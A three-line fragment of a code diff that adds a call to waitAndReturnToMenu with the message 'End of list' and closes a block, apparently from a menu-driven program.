+        waitAndReturnToMenu("End of list");
+    }
 }
